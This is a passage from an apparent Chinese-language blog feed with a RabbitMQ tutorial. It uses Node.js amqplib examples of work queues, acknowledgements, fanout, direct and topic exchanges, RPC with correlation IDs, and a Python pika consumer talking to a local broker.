class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">server</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> conn = <span class="keyword">await</span> amqp.connect(<span class="string">'amqp://127.0.0.1'</span>);</span><br><span class="line">        process.once(<span class="string">'SIGINT'</span>,()=&gt;conn.close());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> ch = <span class="keyword">await</span> conn.createChannel();</span><br><span class="line">        <span class="keyword">await</span> ch.assertQueue(<span class="string">'hello'</span>,&#123;<span class="attr">durable</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">        ch.prefetch(<span class="number">1</span>); <span class="comment">//保证worker一次只处理一个task.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> ch.consume(<span class="string">'hello'</span>,msg=&gt;&#123;</span><br><span class="line">            <span class="keyword">let</span> body = msg.content.toString();</span><br><span class="line"></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"server recieved:"</span>,body);</span><br><span class="line">            <span class="keyword">let</span> secs = body.split(<span class="string">'.'</span>).length - <span class="number">1</span>;</span><br><span class="line">            setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'done'</span>);</span><br><span class="line">                ch.ack(msg);</span><br><span class="line">            &#125;,secs*<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        &#125;,&#123;<span class="attr">noAck</span>:<span class="literal">false</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"waiting for massages."</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.error(err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>需要留意的几点:</p><ul><li><p><code>ch.prefetch(1);</code>,RabbitMQ针对消息分发的默认策略只是简单的第n个消息，发生给第func(n)个workder.这个方法可以保证每个worker一次性只处理一个消息。防止负载不均衡。</p></li><li><p><code>ack</code>: 开启消息确认，只有当接收到该消息的ack时，才从队列里删除该消息；若某个worker在处理消息过程中挂掉，即未发送ack，则该消息将会重新被发送给其他的worker,防止消息丢失。</p></li><li><p><code>durable</code>&amp;<code>persistence</code>:分别标记<code>queue</code>(在producer和consumer两边都要说明)和具体消息（<code>ch.sendToQueue(q, new Buffer(msg), {persistent: true});</code>）的持久化。RabbitMQ可能会突然挂掉，持久化可以在一定程度上保证server重启后，消息队列不丢失。</p></li></ul><h2 id="Publish-Subscribe"><a href="#Publish-Subscribe" class="headerlink" title="Publish/Subscribe"></a>Publish/Subscribe</h2><p>之前的例子是一个消息交由一个worker处理，而这里我们想实现同一个消息分发给多个consumer，这类似于Pub/Sub模式，想想我们的<code>EventEmmiter</code>，为同一个事件（类比这里的消息），订阅多个处理器（类比这里的worker)，消息来临，每个处理器都会被执行。</p><p>在这种模式中，每个<code>consumer</code>都会有一个匿名（或者说随机生成）的queue用于维护消息队列，而处于<code>producer</code>和这些<code>queue</code>之间的是<code>exchange</code>,这相当于一个调度中心，决定将<code>producer</code>产生的消息推给哪些<code>queue</code>。</p><p><img src="http://www.rabbitmq.com/img/tutorials/python-three-overall.png" alt="http://www.rabbitmq.com/img/tutorials/python-three-overall.png"></p><p><code>exchange</code>的调度方式有多种:<code>direct, topic, headers and fanout</code>；我们这里实现类似于事件订阅，使用<code>fanout</code>（广播）。</p><p>之前的直接使用<code>sendToQueue()</code>发送消息到指定名称的queue，实际上只是一个语法糖，内部使用了默认的<code>exchange</code>来调度。</p><p>查看所有<code>exchange</code>:<code>sudo rabbitmqctl list_exchanges</code></p><h3 id="为每个consumer生成新的queue"><a href="#为每个consumer生成新的queue" class="headerlink" title="为每个consumer生成新的queue:"></a>为每个consumer生成新的queue:</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> q = <span class="keyword">await</span> ch.assertQueue(<span class="literal">null</span>, &#123;<span class="attr">exclusive</span>: <span class="literal">true</span>&#125;);</span><br></pre></td></tr></table></figure><h3 id="bindings"><a href="#bindings" class="headerlink" title="bindings"></a>bindings</h3><p>binding指的是<code>exchange</code>和<code>queue</code>间的关系，将<code>queue</code>与指定<code>exchange</code>建立关系，相当于将这个<code>queue</code>加入到了调度中心。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> ch.assertExchange(ex,<span class="string">'fanout'</span>,&#123;<span class="attr">durable</span>:<span class="literal">false</span>&#125;)</span><br><span class="line"><span class="keyword">let</span> q = <span class="keyword">await</span> ch.assertQueue(<span class="literal">null</span>, &#123;<span class="attr">exclusive</span>: <span class="literal">true</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> ch.bindQueue(q.queue,ex,<span class="string">''</span>);</span><br></pre></td></tr></table></figure><p>查看当前所有<code>binding</code>:<code>sudo rabbitmqctl list_bindings</code>:</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/list_bindings.png" alt="http://7xsi10.com1.z0.glb.clouddn.com/list_bindings.png"></p><p>完整例子:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//emit_log.js</span></span><br><span class="line"><span class="keyword">const</span> amqp = <span class="built_in">require</span>(<span class="string">'amqplib'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> ex = <span class="string">'logs'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> conn = <span class="keyword">await</span> amqp.connect(<span class="string">'amqp://127.0.0.1'</span>);</span><br><span class="line">        <span class="keyword">let</span> ch = <span class="keyword">await</span> conn.createChannel();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> ch.assertExchange(ex,<span class="string">'fanout'</span>,&#123;<span class="attr">durable</span>:<span class="literal">false</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> msg = process.argv.slice(<span class="number">2</span>).join(<span class="string">' '</span>) || <span class="string">'info: hello,world'</span>;</span><br><span class="line">        ch.publish(ex,<span class="string">''</span>,<span class="keyword">new</span> Buffer(msg));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"sent:"</span>,msg);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">await</span> ch.close();</span><br><span class="line">        <span class="keyword">await</span> conn.close();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.error(err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log();</span><br><span class="line"></span><br><span class="line"><span class="comment">// receive_log.js</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">receive</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> ex = <span class="string">'logs'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> conn = <span class="keyword">await</span> amqp.connect(<span class="string">'amqp://127.0.0.1'</span>);</span><br><span class="line">        <span class="keyword">let</span> ch = <span class="keyword">await</span> conn.createChannel();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> ch.assertExchange(ex,<span class="string">'fanout'</span>,&#123;<span class="attr">durable</span>:<span class="literal">false</span>&#125;)</span><br><span class="line">        <span class="keyword">let</span> q = <span class="keyword">await</span> ch.assertQueue(<span class="literal">null</span>, &#123;<span class="attr">exclusive</span>: <span class="literal">true</span>&#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"waiting msg in:"</span>,q.queue);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> ch.bindQueue(q.queue,ex,<span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> ch.consume(q.queue,msg=&gt;&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'received:'</span>,msg.content.toString())</span><br><span class="line">        &#125;,&#123;<span class="attr">noAck</span>:<span class="literal">true</span>&#125;);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.error(err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">receive();</span><br></pre></td></tr></table></figure></p><p>运行实例:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/fanout.png" alt="http://7xsi10.com1.z0.glb.clouddn.com/fanout.png"></p><h2 id="Routing"><a href="#Routing" class="headerlink" title="Routing"></a>Routing</h2><p>上面的例子不够灵活，对比事件订阅，某个eventemmiter实例可以订阅不同的事件（分类），而上面的例子可以理解为粗暴的将所有的消息直接广播给所有consumer，即consumer要么对exchange上的所有消息感兴趣，要么都不感兴趣。</p><p>而要表示对部分消息感兴趣，这里通过<code>direct</code> type的exchange调度方式实现。</p><p><img src="http://www.rabbitmq.com/img/tutorials/direct-exchange.png" alt="http://www.rabbitmq.com/img/tutorials/direct-exchange.png"></p><p>当然同一<code>routing</code>的消息可以被多个queue接收，这就类于<code>fanout</code>功能。</p><p>直接上完整实例，这个例子中两个consumer分别对<code>info,warnning</code>和<code>error</code>相关的消息感兴趣，<code>producer</code>每次可以发送消息到不同路由:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// emit_direct.js</span></span><br><span class="line"><span class="keyword">let</span> ex = <span class="string">'direct_logs'</span>;</span><br><span class="line"><span class="keyword">let</span> args = process.argv.slice(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> conn = <span class="keyword">await</span> amqp.connect(<span class="string">'amqp://127.0.0.1'</span>);</span><br><span class="line">    <span class="keyword">let</span> ch = <span class="keyword">await</span> conn.createChannel();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> ch.assertExchange(ex,<span class="string">'direct'</span>,&#123;<span class="attr">durable</span>:<span class="literal">false</span>&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> msg = args.slice(<span class="number">1</span>).join(<span class="string">' '</span>) || <span class="string">'Hello World!'</span>;</span><br><span class="line">    <span class="keyword">let</span> severity = (args.length &gt; <span class="number">0</span>) ? args[<span class="number">0</span>] : <span class="string">'info'</span>;</span><br><span class="line"></span><br><span class="line">    ch.publish(ex,severity,<span class="keyword">new</span> Buffer(msg));</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">" [x] Sent %s: '%s'"</span>, severity, msg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> ch.close();</span><br><span class="line">    <span class="keyword">await</span> conn.close();</span><br><span class="line">&#125; <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">    <span class="built_in">console</span>.error(err);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// recieve_direct.js</span></span><br><span class="line"><span class="keyword">let</span> ex = <span class="string">'direct_logs'</span>;</span><br><span class="line"><span class="keyword">let</span> args = process.argv.slice(<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> conn = <span class="keyword">await</span> amqp.connect(<span class="string">'amqp://127.0.0.1'</span>);</span><br><span class="line">    <span class="keyword">let</span> ch = <span class="keyword">await</span> conn.createChannel();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> ch.assertExchange(ex,<span class="string">'direct'</span>,&#123;<span class="attr">durable</span>:<span class="literal">false</span>&#125;)</span><br><span class="line">    <span class="keyword">let</span> q = <span class="keyword">await</span> ch.assertQueue(<span class="literal">null</span>, &#123;<span class="attr">exclusive</span>: <span class="literal">true</span>&#125;);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"waiting msg in:"</span>,q.queue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> args.map(<span class="function"><span class="params">arg</span>=&gt;</span>ch.bindQueue(q.queue,ex,arg));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> ch.consume(q.queue,msg=&gt;&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">" [x] %s: '%s'"</span>, msg.fields.routingKey, msg.content.toString());</span><br><span class="line">    &#125;,&#123;<span class="attr">noAck</span>:<span class="literal">true</span>&#125;);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">    <span class="built_in">console</span>.error(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行实例:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/direct.png" alt="http://7xsi10.com1.z0.glb.clouddn.com/direct.png"></p><h2 id="Topics"><a href="#Topics" class="headerlink" title="Topics"></a>Topics</h2><p>上面的例子还可以更加灵活，对于一个消息，可以从多方面去描述，然后不同的queue表达对某方面感兴趣，而对于其他方面进行忽略：</p><p><img src="http://www.rabbitmq.com/img/tutorials/python-five.png" alt="http://www.rabbitmq.com/img/tutorials/python-five.png"></p><p>如图，Q1表示对颜色为orange的消息感兴趣，Q2对物种是兔子，跑的慢的感兴趣，而不在乎颜色。</p><p><code>*</code> 代指一个单词，<code>#</code>代指任意个单词。</p><p>代码方面，与上例类似，不过是<code>exchange</code>类型为<code>topic</code>,<code>routing keys</code>格式的变化:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ch.assertExchange(ex, <span class="string">'topic'</span>, &#123;<span class="attr">durable</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">ch.publish(ex, <span class="string">'anonymous.info'</span>, <span class="keyword">new</span> Buffer(msg));</span><br></pre></td></tr></table></figure></p><h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h2><p>可以通过RabbitMQ实现RPC</p><h3 id="callback-queue"><a href="#callback-queue" class="headerlink" title="callback queue"></a>callback queue</h3><p><code>reply_to</code>（即为回调指定队列）有两种情况，一种是针对每一个request，都创建（随机生成）一个新的queue:<br><img src="http://www.rabbitmq.com/img/tutorials/python-six.png" alt="http://www.rabbitmq.com/img/tutorials/python-six.png"><br>另一种是每个request使用同一queue（使用固定命名即可）。</p><p>第二种更为高效，但是需要解决一个问题，当同时调用多个request的时候，会有多个response,如何使它们匹配。解决方案是加入<code>Correlation Id</code>，其对于每一个request都是独一无二的，每个client接收到消息后进行<code>Correlation Id</code>判断:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> ch.consume(q.queue,msg=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.properties.correlationId == corr) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;,&#123;<span class="attr">noAck</span>:<span class="literal">false</span>&#125;);</span><br><span class="line"></span><br><span class="line">ch.sendToQueue(<span class="string">'rpc_server'</span>,</span><br><span class="line"><span class="keyword">new</span> Buffer(num.toString()),</span><br><span class="line">&#123; <span class="attr">correlationId</span>: corr, <span class="attr">replyTo</span>: q.queue &#125;);</span><br></pre></td></tr></table></figure><p>完整实例：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rpc_client.js</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">client</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> args = process.argv.slice(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">let</span> corr = generateUuid();</span><br><span class="line">    <span class="keyword">let</span> num = <span class="built_in">parseInt</span>(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> conn = <span class="keyword">await</span> amqp.connect(<span class="string">'amqp://127.0.0.1'</span>);</span><br><span class="line">        <span class="keyword">let</span> ch = <span class="keyword">await</span> conn.createChannel();</span><br><span class="line">        <span class="keyword">let</span> q = <span class="keyword">await</span> ch.assertQueue(<span class="string">'rpc_client'</span>,&#123;<span class="attr">exclusive</span>: <span class="literal">false</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">' [x] Requesting fib(%d)'</span>, num);</span><br><span class="line">        <span class="built_in">console</span>.log(q.queue)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> ch.consume(q.queue,msg=&gt;&#123;</span><br><span class="line">            <span class="keyword">if</span> (msg.properties.correlationId == corr) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">' [.] Got %s'</span>, msg.content.toString());</span><br><span class="line">                ch.ack(msg)</span><br><span class="line">                setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123; conn.close(); process.exit(<span class="number">0</span>) &#125;, <span class="number">2500</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,&#123;<span class="attr">noAck</span>:<span class="literal">false</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ch.sendToQueue(<span class="string">'rpc_server'</span>,</span><br><span class="line">        <span class="keyword">new</span> Buffer(num.toString()),</span><br><span class="line">        &#123; <span class="attr">correlationId</span>: corr, <span class="attr">replyTo</span>: q.queue &#125;);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.error(err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateUuid</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.random().toString() +</span><br><span class="line">           <span class="built_in">Math</span>.random().toString() +</span><br><span class="line">           <span class="built_in">Math</span>.random().toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rpc_server.js</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">server</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> conn = <span class="keyword">await</span> amqp.connect(<span class="string">'amqp://127.0.0.1'</span>);</span><br><span class="line">        <span class="keyword">let</span> ch = <span class="keyword">await</span> conn.createChannel();</span><br><span class="line">        process.once(<span class="string">'SIGINT'</span>,()=&gt;conn.close());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> q = <span class="keyword">await</span> ch.assertQueue(<span class="string">'rpc_server'</span>);</span><br><span class="line">        ch.prefetch(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">' [x] Awaiting RPC requests'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> ch.consume(q.queue,msg=&gt;&#123;</span><br><span class="line">            <span class="keyword">let</span> n = <span class="built_in">parseInt</span>(msg.content.toString());</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">" [.] fib(%d)"</span>, n);</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">let</span> r = fibonacci(n);</span><br><span class="line">    </span><br><span class="line">            ch.sendToQueue(msg.properties.replyTo,</span><br><span class="line">            <span class="keyword">new</span> Buffer(r.toString()),</span><br><span class="line">            &#123;<span class="attr">correlationId</span>: msg.properties.correlationId&#125;);</span><br><span class="line">    </span><br><span class="line">            ch.ack(msg);</span><br><span class="line">        &#125;,&#123;<span class="attr">noAck</span>:<span class="literal">false</span>&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fibonacci</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span> || n == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> fibonacci(n - <span class="number">1</span>) + fibonacci(n - <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>同意可以启动多个server实例来并行进行计算任务：</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/rpc.png" alt="http://7xsi10.com1.z0.glb.clouddn.com/rpc.png"></p><p>注意点：</p><ul><li><code>exclusive</code>: 这里不能为true,不然会出现同时启动多个client失败;</li><li><code>ack</code>:　需要开启ack，否则会出现后续的client调用永远处于等待状态。</li></ul><p>目前发现如果对所有client共享一个queue，多个request竟然是串行执行的，即需要前一个client关闭后，后一个client才会返回结果。经过排查，<code>server</code>端是正常接收到多个request的，理论来说应该是及时向client回复了信息的。问题出现在client这里。而对每个client使用不同的queue是没有这个问题的。</p><p>待解决…</p><h2 id="跨语言通信"><a href="#跨语言通信" class="headerlink" title="跨语言通信"></a>跨语言通信</h2><p><em>注：实例来自《Node.js实战》</em></p><p>上面的例子都是在Node进程之间进行的，RabbitMQ本身就用于横向扩展的集群服务之间的消息通信，当然支持不同主机，不同语言服务之间的通信。</p><p>一个简单的例子:<code>server.py</code>作为consumer:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pika</span><br><span class="line"></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(</span><br><span class="line">    host=<span class="string">"localhost"</span></span><br><span class="line">))</span><br><span class="line"></span><br><span class="line">channel = connection.channel()</span><br><span class="line"></span><br><span class="line">channel.queue_declare(queue=<span class="string">"hello"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"waiting for massage from queue hello"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">(ch,method,properties,body)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Received: %r"</span> % (body,)</span><br><span class="line"></span><br><span class="line">channel.basic_consume(callback,queue=<span class="string">"hello"</span>,no_ack=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">channel.start_consuming()</span><br></pre></td></tr></table></figure></p><p>producer还是我们之前第一个例子的<code>client.js</code>，运行结果：</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/node_py.png" alt="http://7xsi10.com1.z0.glb.clouddn.com/node_py.png"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>篇幅有限，这篇文章就只做一些基础的介绍，还有诸如与HTTP方案对比，RabbitMQ集群等等，后续文章进行总结。</p><p>参考:</p><ul><li>RabbitMQ官网：<a href="http://www.rabbitmq.com/" target="_blank" rel="noopener">http://www.rabbitmq.com/</a></li><li>AMQP官网: <a href="https://www.amqp.org" target="_blank" rel="noopener">https://www.amqp.org</a></li><li>amqp.node: <a href="http://www.squaremobius.net/amqp.node/" target="_blank" rel="noopener">http://www.squaremobius.net/amqp.node/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习RabbitMQ.以Node client实现为例。&lt;/p&gt;
&lt;p&gt;RabbitMQ是一个由erlang开发的AMQP（Advanced Message Queue ）的开源实现。目前RabbitMQ基于AMQP 0-9-1。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img.blog.csdn.net/20160310091724939&quot; alt=&quot;http://img.blog.csdn.net/20160310091724939&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Nodejs" scheme="http://luoxia.me/code/categories/Nodejs/"/>
    
    
      <category term="RabbitMQ" scheme="http://luoxia.me/code/tags/RabbitMQ/"/>
    
      <category term="AMQP" scheme="http://luoxia.me/code/tags/AMQP/"/>
    
      <category term="RPC" scheme="http://luoxia.me/code/tags/RPC/"/>
    
  </entry>
  
  <entry>
    <title>从Functors到Monad</title>
    <link href="http://luoxia.me/code/2017/08/17/%E4%BB%8EFunctors%E5%88%B0Monad/"/>
    <id>http://luoxia.me/code/2017/08/17/从Functors到Monad/</id>
    <published>2017-08-17T01:35:33.000Z</published>
    <updated>2017-11-16T13:10:06.490Z</updated>
    
